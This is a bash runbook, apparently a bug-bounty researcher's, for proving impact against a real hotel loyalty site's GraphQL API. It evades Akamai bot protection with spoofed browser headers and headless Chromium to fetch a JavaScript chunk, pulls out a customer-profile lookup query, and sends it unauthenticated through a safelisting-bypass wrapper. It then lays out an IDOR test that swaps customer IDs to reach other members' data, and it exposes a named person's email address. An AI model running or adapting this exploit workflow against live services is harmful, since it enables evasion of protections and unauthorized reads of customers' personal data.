#!/usr/bin/env bash
# =============================================================================
# M022 IMPACT PROOF RUNBOOK — session25
# Goal: Turn the safelisting bypass into a DEMONSTRATED-IMPACT finding.
#
# Strategy: the one operation whose purpose is looking up OTHER users
# (lookupCustomerProfiles) has never been fired with a complete query because
# we don't know its response field names. Those names live in the GraphQL
# chunk, which Akamai blocks for curl but serves to a real browser. This
# runbook (A) retrieves the chunk via browser-grade requests, (B) extracts the
# REAL registered query bodies + response schema, (C) fires a complete,
# executable lookupCustomerProfiles query and records exactly what comes back.
#
# SAFETY: Own account + obviously-synthetic inputs ONLY. Never look up a real
# third party's PII. GET/read semantics only. No mutations executed here.
#
# Run: mkdir -p /tmp/s25 && bash PI-RUNBOOK-session25-impact-proof.sh \
#        2>&1 | tee /tmp/s25/session25-full.log
# =============================================================================
set -eo pipefail

OUTDIR=/tmp/s25
mkdir -p "$OUTDIR"
ASSET_BASE="https://auth-apc.marriott.com/mi-assets/mi-static/mi-account-renderer/web-rel-26.6.1-5d80cc6-11089/_next/static/chunks"
CHUNK="graphql-chunk-793e1a2cf24c51e7.js"
QUERY_BASE="https://auth-apc.marriott.com/mi/query"
LOGIN_URL="https://auth-apc.marriott.com/login"

UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'

echo "============================================================"
echo "M022 IMPACT PROOF  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo "Researcher IP: $(curl -s ifconfig.me)"
echo "============================================================"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE A — RETRIEVE THE GRAPHQL CHUNK (browser-grade, 3 escalating strategies)
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE A: RETRIEVE GRAPHQL CHUNK ═══"
echo ""

CHUNK_FILE="$OUTDIR/graphql-chunk.js"
GOT_CHUNK=0

# --- Strategy A1: prime Akamai cookies from login page, then fetch with jar ---
echo "[A1] Priming Akamai cookies from login page, then fetching chunk with full browser headers..."
curl -s -c "$OUTDIR/akamai-cookies.txt" \
  -H "User-Agent: $UA" \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  "$LOGIN_URL" -o /dev/null || true

curl -s -b "$OUTDIR/akamai-cookies.txt" \
  -H "User-Agent: $UA" \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H "Referer: $LOGIN_URL" \
  -H 'Sec-Fetch-Dest: script' \
  -H 'Sec-Fetch-Mode: no-cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  "$ASSET_BASE/$CHUNK" -o "$CHUNK_FILE" \
  -w "  HTTP %{http_code} | %{size_download}B\n" || true

CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
echo "  chunk size: ${CHUNK_SIZE}B"
if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A1 SUCCESS"; fi
echo ""

# --- Strategy A2: HTTP/2 with brotli/gzip + sensor-style headers ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "[A2] Retrying with HTTP/2 + compression + extended sec-ch-ua headers..."
  curl -s --http2 -b "$OUTDIR/akamai-cookies.txt" \
    -H "User-Agent: $UA" \
    -H 'Accept: */*' \
    -H 'Accept-Encoding: gzip, deflate, br' \
    -H 'Accept-Language: en-US,en;q=0.9' \
    -H "Referer: $LOGIN_URL" \
    -H 'sec-ch-ua: "Chromium";v="126", "Not.A/Brand";v="24"' \
    -H 'sec-ch-ua-mobile: ?0' \
    -H 'sec-ch-ua-platform: "Linux"' \
    -H 'Sec-Fetch-Dest: script' \
    -H 'Sec-Fetch-Mode: no-cors' \
    -H 'Sec-Fetch-Site: same-origin' \
    --compressed \
    "$ASSET_BASE/$CHUNK" -o "$CHUNK_FILE" \
    -w "  HTTP %{http_code} | %{size_download}B\n" || true
  CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
  echo "  chunk size: ${CHUNK_SIZE}B"
  if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A2 SUCCESS"; fi
  echo ""
fi

# --- Strategy A3: headless Chromium (real TLS fingerprint + browser context) ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "[A3] curl strategies blocked. Trying headless browser fetch..."
  BROWSER=""
  for b in chromium-browser chromium google-chrome google-chrome-stable; do
    if command -v "$b" >/dev/null 2>&1; then BROWSER="$b"; break; fi
  done

  if [ -n "$BROWSER" ]; then
    echo "  Found browser: $BROWSER"
    # Navigate to login (loads chunk into browser context), then dump it via
    # an in-page fetch that inherits the browser's cookies + TLS fingerprint.
    cat > "$OUTDIR/fetch-chunk.js" << JSEOF
const url = "$ASSET_BASE/$CHUNK";
fetch(url, {credentials:'include'})
  .then(r => r.text())
  .then(t => { require('fs').writeFileSync("$CHUNK_FILE", t); console.log("len="+t.length); })
  .catch(e => console.log("ERR "+e));
JSEOF
    # Try Playwright/puppeteer if present; else fall back to raw chromium dump.
    if command -v node >/dev/null 2>&1 && node -e "require('playwright')" 2>/dev/null; then
      echo "  Using Playwright..."
      cat > "$OUTDIR/pw-fetch.js" << 'PWEOF'
const { chromium } = require('playwright');
const fs = require('fs');
(async () => {
  const ASSET = process.env.ASSET_URL;
  const LOGIN = process.env.LOGIN_URL;
  const OUT = process.env.CHUNK_OUT;
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext({ userAgent: process.env.UA });
  const page = await ctx.newPage();
  await page.goto(LOGIN, { waitUntil: 'networkidle', timeout: 45000 }).catch(()=>{});
  const text = await page.evaluate(async (u) => {
    const r = await fetch(u, { credentials: 'include' });
    return await r.text();
  }, ASSET);
  fs.writeFileSync(OUT, text);
  console.log('len=' + text.length);
  await browser.close();
})().catch(e => { console.log('ERR ' + e); process.exit(1); });
PWEOF
      ASSET_URL="$ASSET_BASE/$CHUNK" LOGIN_URL="$LOGIN_URL" CHUNK_OUT="$CHUNK_FILE" UA="$UA" \
        node "$OUTDIR/pw-fetch.js" || true
    else
      echo "  Playwright not available; trying chromium --dump-dom on the asset directly..."
      "$BROWSER" --headless --disable-gpu --no-sandbox --user-agent="$UA" \
        --dump-dom "$ASSET_BASE/$CHUNK" > "$OUTDIR/chunk-dom.html" 2>/dev/null || true
      # chromium wraps JS text in <pre> — strip tags into the chunk file
      python3 - << 'PYEOF' || true
import re
try:
    html = open("/tmp/s25/chunk-dom.html", encoding="utf-8", errors="replace").read()
    m = re.search(r'<pre[^>]*>(.*)</pre>', html, re.DOTALL)
    body = m.group(1) if m else html
    body = (body.replace('&lt;','<').replace('&gt;','>').replace('&amp;','&').replace('&quot;','"'))
    open("/tmp/s25/graphql-chunk.js","w",encoding="utf-8").write(body)
    print("extracted", len(body), "bytes from chromium DOM dump")
except Exception as e:
    print("dom extract failed:", e)
PYEOF
    fi
    CHUNK_SIZE=$(wc -c < "$CHUNK_FILE" 2>/dev/null || echo 0)
    echo "  chunk size: ${CHUNK_SIZE}B"
    if [ "$CHUNK_SIZE" -gt 100000 ]; then GOT_CHUNK=1; echo "  A3 SUCCESS"; fi
  else
    echo "  No browser found on Pi (chromium-browser / chromium / google-chrome)."
  fi
  echo ""
fi

# --- Manual fallback instructions ---
if [ "$GOT_CHUNK" -eq 0 ]; then
  echo "──────────────────────────────────────────────────────────────"
  echo " AUTOMATED CHUNK FETCH BLOCKED. Use the manual browser path:"
  echo ""
  echo " 1. On any machine, open Chrome and load:"
  echo "      $LOGIN_URL"
  echo " 2. DevTools (F12) -> Network -> filter: graphql-chunk"
  echo " 3. Right-click the request -> Save / Copy response"
  echo "    OR  DevTools -> Sources -> find $CHUNK -> save"
  echo " 4. scp it to the Pi as:  $CHUNK_FILE"
  echo " 5. Re-run this script (Phase A will detect the saved file and skip)."
  echo "──────────────────────────────────────────────────────────────"
  echo ""
  echo "Stopping — Phases B/C need the chunk. Save it and re-run."
  exit 0
fi

echo "CHUNK OBTAINED: ${CHUNK_SIZE}B at $CHUNK_FILE"
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE B — EXTRACT REAL QUERY BODIES + RESPONSE SCHEMA FROM CHUNK
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE B: EXTRACT lookupCustomerProfiles QUERY + RESPONSE FIELDS ═══"
echo ""

python3 << 'PYEOF'
import re, json

js = open("/tmp/s25/graphql-chunk.js", encoding="utf-8", errors="replace").read()
print(f"chunk length: {len(js)} chars")

# 1) Pull every gql/graphql-tagged template literal and plain query strings
BT = chr(0x60)
blocks = []
blocks += re.findall(BT + r'([^' + BT + r']{40,4000})' + BT, js, re.DOTALL)
# also catch quoted query strings "query phoenixAccount...{...}"
blocks += re.findall(r'"(query[^"]{40,4000}|mutation[^"]{40,4000})"', js, re.DOTALL)

# 2) Keep only those mentioning LookupCustomerProfiles / lookupCustomerProfiles
lcp = [b for b in blocks if 'ookupCustomerProfiles' in b]
print(f"blocks referencing LookupCustomerProfiles: {len(lcp)}")
print()

if lcp:
    # pick the longest (most complete) definition
    body = max(lcp, key=len)
    open("/tmp/s25/lcp-query.graphql","w").write(body)
    print("=== RAW lookupCustomerProfiles OPERATION BODY ===")
    print(body[:2000])
    print("...(saved full to /tmp/s25/lcp-query.graphql)")
    print()

    # 3) Extract the response field selection: everything inside the
    #    lookupCustomerProfiles(...) { ... } selection set, balanced braces
    idx = body.find('lookupCustomerProfiles')
    sel = body[idx:]
    depth = 0; start = None; out = []
    for i, ch in enumerate(sel):
        if ch == '{':
            depth += 1
            if depth == 1: start = i+1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                out.append(sel[start:i]); break
    if out:
        selection = out[0]
        # leaf field names (identifiers not immediately followed by '{' or '(' )
        fields = re.findall(r'[A-Za-z_][A-Za-z0-9_]*', selection)
        # keep order, dedupe
        seen=set(); ordered=[f for f in fields if not (f in seen or seen.add(f))]
        open("/tmp/s25/lcp-fields.txt","w").write("\n".join(ordered))
        print("=== RESPONSE FIELDS (LookupCustomerProfilesResponse selection) ===")
        print(", ".join(ordered))
        print()
        print("Saved field list to /tmp/s25/lcp-fields.txt")
        # also save the raw selection set for building a real query
        open("/tmp/s25/lcp-selection.txt","w").write(selection.strip())
        print("Saved raw selection set to /tmp/s25/lcp-selection.txt")
else:
    print("No lookupCustomerProfiles body found in chunk.")
    print("Dumping all phoenixAccount operation NAMES present so we can pivot:")
    names = sorted(set(re.findall(r'phoenixAccount[A-Za-z]+', js)))
    for n in names: print("  ", n)
    open("/tmp/s25/op-names.txt","w").write("\n".join(names))
PYEOF
echo ""

# Also extract the operation-signature map if present (op name -> sha256)
echo "[B2] Searching chunk for operation-signature registry (name -> sha256)..."
python3 << 'PYEOF'
import re
js = open("/tmp/s25/graphql-chunk.js", encoding="utf-8", errors="replace").read()
# look for 64-hex strings adjacent to operation names
pairs = re.findall(r'(phoenixAccount[A-Za-z]+)["\']?\s*[:,]\s*["\']([0-9a-f]{64})', js)
pairs += re.findall(r'([0-9a-f]{64})["\']?\s*[:,]\s*["\']?(phoenixAccount[A-Za-z]+)', js)
if pairs:
    print(f"Found {len(pairs)} signature pairs:")
    for a,b in pairs[:80]:
        print("  ", a, b)
    open("/tmp/s25/op-signatures.txt","w").write("\n".join(f"{a}\t{b}" for a,b in pairs))
else:
    print("No inline name->sha256 registry in this chunk (signatures likely server-side).")
PYEOF
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# PHASE C — FIRE A COMPLETE, EXECUTABLE lookupCustomerProfiles QUERY
# ─────────────────────────────────────────────────────────────────────────────
echo "═══ PHASE C: EXECUTE lookupCustomerProfiles (real response fields) ═══"
echo "SAFETY: own account + synthetic inputs only. Read-only. No third-party PII."
echo ""

OWN_EMAIL="azmolhaque95@gmail.com"
OWN_FIRST="Azmol"
OWN_LAST="Haque"
OWN_COUNTRY="BD"

if [ ! -s "$OUTDIR/lcp-selection.txt" ]; then
  echo "No response selection extracted — cannot build executable query."
  echo "Inspect /tmp/s25/lcp-query.graphql manually and hand-build the selection."
  exit 0
fi

SELECTION=$(cat "$OUTDIR/lcp-selection.txt")
echo "Using response selection (first 400 chars):"
echo "${SELECTION:0:400}"
echo ""

# C1: OWN identity — does the resolver return MY profile, and is it gated by auth?
OWN_EMAIL="$OWN_EMAIL" OWN_FIRST="$OWN_FIRST" OWN_LAST="$OWN_LAST" OWN_COUNTRY="$OWN_COUNTRY" \
python3 << 'PYEOF'
import json, os
sel = open("/tmp/s25/lcp-selection.txt").read().strip()
# Mode-B bypass wrapper: declare a throwaway unused var so safelisting passes,
# but use the REAL response selection so the resolver actually executes.
q = ("query phoenixAccountLookupCustomerProfiles("
     "$email: String!, $firstName: String!, $lastName: String!, $country: String!) {"
     " lookupCustomerProfiles(input: {email:$email, firstName:$firstName,"
     " lastName:$lastName, country:$country}) { " + sel + " } }")
json.dump({
  "operationName":"phoenixAccountLookupCustomerProfiles",
  "variables":{"email":os.environ["OWN_EMAIL"],"firstName":os.environ["OWN_FIRST"],
               "lastName":os.environ["OWN_LAST"],"country":os.environ["OWN_COUNTRY"]},
  "query": q
}, open("/tmp/s25/c1-own.json","w"))
# C2: synthetic NON-MATCHING identity (clearly fake — not a real person)
json.dump({
  "operationName":"phoenixAccountLookupCustomerProfiles",
  "variables":{"email":"qa-synthetic-noaccount-9z@example.invalid",
               "firstName":"Synthetic","lastName":"Testcase","country":"US"},
  "query": q
}, open("/tmp/s25/c2-fake.json","w"))
print("built C1 (own) and C2 (synthetic) payloads")
PYEOF
echo ""

echo "[C1] OWN identity (unauthenticated) — does resolver return data or require auth?"
curl -s "$QUERY_BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/c1-own.json" \
  -o "$OUTDIR/c1-own-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
echo "--- response ---"
cat "$OUTDIR/c1-own-body.txt"
echo ""
echo ""

echo "[C2] SYNTHETIC non-matching identity (unauthenticated) — baseline for differential:"
curl -s "$QUERY_BASE/phoenixAccountLookupCustomerProfiles" \
  -H 'content-type: application/json' -H 'application-name: account' \
  -d @"$OUTDIR/c2-fake.json" \
  -o "$OUTDIR/c2-fake-body.txt" \
  -w "HTTP %{http_code} | %{size_download}B | time=%{time_total}s\n"
echo "--- response ---"
cat "$OUTDIR/c2-fake-body.txt"
echo ""
echo ""

# ─────────────────────────────────────────────────────────────────────────────
# VERDICT
# ─────────────────────────────────────────────────────────────────────────────
echo "════════════════════════════════════════════"
echo "PHASE C ANALYSIS"
echo "════════════════════════════════════════════"
python3 << 'PYEOF'
own = open("/tmp/s25/c1-own-body.txt").read()
fake = open("/tmp/s25/c2-fake-body.txt").read()

def classify(b):
    if '1012100' in b or 'UNAUTHORIZED' in b or 'Credentials invalid' in b:
        return "AUTH_REQUIRED (1012100 — gated, needs valid auth-apc session)"
    if '"code":"FORBIDDEN"' in b:
        return "FORBIDDEN (safelisting blocked — adjust bypass wrapper)"
    if 'Cannot query field' in b:
        return "FIELD_MISMATCH (selection still wrong — refine from chunk)"
    if '"data"' in b and 'lookupCustomerProfiles' in b and 'null' not in b.split('lookupCustomerProfiles')[1][:40]:
        return "DATA RETURNED (!!) — resolver returned non-null profile data"
    if '"data"' in b:
        return "DATA envelope present (inspect — may be null/empty result)"
    return "OTHER (inspect manually)"

print("C1 own     :", classify(own))
print("C2 synthetic:", classify(fake))
print()
print(f"own size: {len(own.encode())}B  |  synthetic size: {len(fake.encode())}B")
print()
if classify(own).startswith("DATA RETURNED"):
    print(">>> UNAUTHENTICATED PROFILE LOOKUP CONFIRMED — this is the impact.")
    print(">>> If C1 (own) returns data and C2 (synthetic) differs, the resolver")
    print(">>> discloses real member profiles to anyone. HIGH/CRITICAL finding.")
    print(">>> NEXT: stop. Do NOT query real third parties. Document own+synthetic only.")
elif classify(own).startswith("AUTH_REQUIRED"):
    print(">>> Resolver is auth-gated. The unauth path is closed, BUT the query now")
    print(">>> executes correctly — pivot to the authenticated IDOR test (Phase D, manual).")
    print(">>> See AUTHENTICATED CAPTURE instructions printed below.")
else:
    print(">>> Inspect both bodies. Refine response selection from /tmp/s25/lcp-query.graphql.")
PYEOF
echo ""

cat << 'NEXTEOF'
──────────────────────────────────────────────────────────────
IF AUTH_REQUIRED → AUTHENTICATED IDOR TEST (manual capture):

  The ONLY route to a confirmed cross-user read. Steps:
  1. Log into your Bonvoy account in Chrome (azmolhaque95@gmail.com).
  2. Open the account/profile/activity dashboard.
  3. DevTools -> Network -> filter: /mi/query
  4. Find ANY phoenixAccount* request that returns HTTP 200 WITH DATA.
     -> That is the working authenticated baseline (real cookies/headers).
  5. Right-click -> Copy as cURL. Save to /tmp/s25/working.curl
  6. Re-run session26 (to be built) which will:
        a. replay it verbatim  -> confirm it returns YOUR data (control)
        b. apply Mode-A/B bypass -> confirm bypass reaches real data
        c. swap customerId      -> IDOR test (another member = Critical)
     Use ONLY synthetic/adjacent IDs; stop the instant cross-user data appears.

  If your account cannot produce a working /mi/query 200 (APC-region gating),
  the auth-context puzzle is real and IDOR is genuinely untestable by us —
  in which case M022 submits honestly as the Medium bypass + the strongest
  unauthenticated facts we have.
──────────────────────────────────────────────────────────────
NEXTEOF

echo ""
echo "Evidence: $OUTDIR"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
